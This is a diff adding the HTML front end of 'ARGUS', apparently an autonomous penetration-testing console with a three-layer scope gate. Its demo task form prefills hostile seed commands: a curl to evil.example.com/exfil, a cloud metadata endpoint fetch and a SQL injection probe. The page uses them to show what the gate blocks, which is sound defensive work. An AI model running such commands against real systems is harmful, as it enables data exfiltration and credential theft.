@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>ARGUS · 自主渗透测试控制台</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='8' fill='%237c5cff'/%3E%3Ctext x='16' y='23' font-size='18' text-anchor='middle' fill='white' font-family='monospace'%3EA%3C/text%3E%3C/svg%3E" />
+<link rel="stylesheet" href="/styles.css" />
+</head>
+<body>
+<div class="app">
+  <aside class="rail">
+    <div class="brand">
+      <div class="logo">A</div>
+      <div class="brand-text">
+        <b>ARGUS</b>
+        <span id="ver">v0.1.0</span>
+      </div>
+      <div id="health" class="dot" title="服务状态"></div>
+    </div>
+
+    <div class="rail-actions">
+      <button id="btnNew" class="btn primary block">+ 新建任务</button>
+      <button id="btnDemo" class="btn ghost block">⚡ 一键演示任务</button>
+    </div>
+
+    <div class="rail-title">任务 <span id="taskCount" class="muted">0</span></div>
+    <div id="taskList" class="task-list"></div>
+
+    <div class="rail-foot">
+      <div class="gate-mini">
+        <span class="g intent" title="意图层">I</span>
+        <span class="g exec" title="执行层">E</span>
+        <span class="g network" title="网络层">N</span>
+        <span class="muted">三层闸门</span>
+      </div>
+      <div class="muted small">默认拒绝 · 元数据黑洞</div>
+    </div>
+  </aside>
+
+  <main class="main">
+    <header class="topbar">
+      <div class="topbar-left">
+        <h1 id="taskTitle">未选择任务</h1>
+        <span id="taskState" class="pill idle">—</span>
+      </div>
+      <div class="topbar-right">
+        <button id="btnStart" class="btn primary" disabled>启动</button>
+        <button id="btnStop" class="btn ghost" disabled>停止</button>
+        <button id="btnRefresh" class="btn ghost">刷新</button>
+      </div>
+    </header>
+
+    <section id="empty" class="empty">
+      <div class="empty-card">
+        <div class="empty-icon">◎</div>
+        <h2>还没有任务</h2>
+        <p>点击左侧「一键演示任务」会创建一个带授权范围（<code>lab.internal</code> + <code>10.20.0.0/16</code>）的示例任务，<br/>
+           里面包含 3 条正常意图、3 条越界尝试和 1 条带证据的漏洞结论。</p>
+      </div>
+    </section>
+
+    <section id="detail" class="detail hidden">
+      <div class="goal-row">
+        <span class="label">目标</span>
+        <span id="taskGoal" class="goal-text"></span>
+      </div>
+
+      <div class="kpis">
+        <div class="kpi"><span class="kpi-label">意图</span><b id="kIntents">0</b><i id="kIntentsSub" class="muted">—</i></div>
+        <div class="kpi ok"><span class="kpi-label">完成</span><b id="kDone">0</b><i class="muted">done</i></div>
+        <div class="kpi warn"><span class="kpi-label">拦截</span><b id="kBlocked">0</b><i class="muted">exec 层</i></div>
+        <div class="kpi danger"><span class="kpi-label">越界</span><b id="kViol">0</b><i class="muted">三层合计</i></div>
+        <div class="kpi accent"><span class="kpi-label">漏洞</span><b id="kFind">0</b><i class="muted">带证据</i></div>
+        <div class="kpi"><span class="kpi-label">证据</span><b id="kEv">0</b><i id="kEvSub" class="muted">链校验 —</i></div>
+      </div>
+
+      <nav class="tabs">
+        <button class="tab active" data-tab="overview">概览</button>
+        <button class="tab" data-tab="intents">意图</button>
+        <button class="tab" data-tab="findings">漏洞</button>
+        <button class="tab" data-tab="violations">越界拦截</button>
+        <button class="tab" data-tab="evidence">证据</button>
+        <button class="tab" data-tab="report">报告</button>
+      </nav>
+
+      <div id="pane-overview" class="pane active">
+        <div class="grid2">
+          <div class="card">
+            <div class="card-head">三层闸门</div>
+            <div class="layers">
+              <div class="layer">
+                <span class="badge intent">1 · intent</span>
+                <p>派发意图、写资产前的校验。<b>空范围直接拒绝。</b></p>
+                <div class="meter"><i id="mIntent"></i></div>
+              </div>
+              <div class="layer">
+                <span class="badge exec">2 · exec</span>
+                <p>从工具输入抽取 URL/IP/域名，<b>先解析再判定</b>，解析失败即失败关闭。</p>
+                <div class="meter"><i id="mExec"></i></div>
+              </div>
+              <div class="layer">
+                <span class="badge network">3 · network</span>
+                <p>建立 socket 前只认 IP，<b>不解析域名</b> —— DNS 重绑定也绕不过。</p>
+                <div class="meter"><i id="mNet"></i></div>
+              </div>
+            </div>
+          </div>
+          <div class="card">
+            <div class="card-head">范围与预算</div>
+            <div id="scopeList" class="chips"></div>
+            <div class="card-head mt">预算（前 8 项）</div>
+            <div id="budgetList" class="budget"></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-head">最近证据</div>
+          <div id="evTimeline" class="timeline"></div>
+        </div>
+      </div>
+
+      <div id="pane-intents" class="pane">
+        <div class="card"><div class="card-head">探索路径</div>
+          <table class="tbl"><thead><tr><th>#</th><th>状态</th><th>意图</th><th>动作</th><th>指纹</th></tr></thead>
+          <tbody id="tbIntents"></tbody></table>
+        </div>
+      </div>
+
+      <div id="pane-findings" class="pane">
+        <div id="findingsList" class="findings"></div>
+      </div>
+
+      <div id="pane-violations" class="pane">
+        <div class="card"><div class="card-head">越界记录（三层统一记账）</div>
+          <table class="tbl"><thead><tr><th>层</th><th>目标</th><th>原因</th><th>工具</th><th>时间</th></tr></thead>
+          <tbody id="tbViol"></tbody></table>
+        </div>
+      </div>
+
+      <div id="pane-evidence" class="pane">
+        <div class="card"><div class="card-head">证据链（只追加 · 哈希链接）</div>
+          <table class="tbl"><thead><tr><th>ID</th><th>类型</th><th>哈希</th><th>时间</th></tr></thead>
+          <tbody id="tbEv"></tbody></table>
+        </div>
+      </div>
+
+      <div id="pane-report" class="pane">
+        <div class="card">
+          <div class="card-head">报告
+            <span class="card-actions">
+              <button id="btnCopy" class="btn tiny ghost">复制</button>
+              <button id="btnDownload" class="btn tiny ghost">下载 .md</button>
+            </span>
+          </div>
+          <pre id="reportBox" class="report">（加载中）</pre>
+        </div>
+      </div>
+    </section>
+  </main>
+</div>
+
+<div id="toast" class="toast"></div>
+<div id="modal" class="modal hidden">
+  <div class="modal-card">
+    <div class="modal-head">新建任务 <button id="modalClose" class="btn tiny ghost">✕</button></div>
+    <label>任务名<input id="fName" placeholder="lab-1" /></label>
+    <label>目标描述<input id="fGoal" placeholder="评估 lab.internal 的 Web 面风险" /></label>
+    <label>授权范围（每行一条，格式 kind:value）
+      <textarea id="fScope" rows="3">domain_suffix:lab.internal
+cidr:10.20.0.0/16</textarea>
+    </label>
+    <label>种子意图（每行一条，格式 动作|工具输入|漏洞类别可选）
+      <textarea id="fSeed" rows="4">Bash|{"command":"nmap -sV -p 80,443 lab.internal"}|
+WebFetch|{"url":"http://api.lab.internal/v1/users?id=1"}|
+Bash|{"command":"curl http://evil.example.com/exfil"}|
+Bash|{"command":"curl http://169.254.169.254/latest/meta-data/"}|
+Bash|{"command":"curl 'http://api.lab.internal/v1/users?id=1%27'"}|SQL 注入</textarea>
+    </label>
+    <div class="modal-foot">
+      <button id="btnCancel" class="btn ghost">取消</button>
+      <button id="btnCreate" class="btn primary">创建并启动</button>
+    </div>
+  </div>
+</div>
+
+<script src="/app.js"></script>
+</body>
+</html>
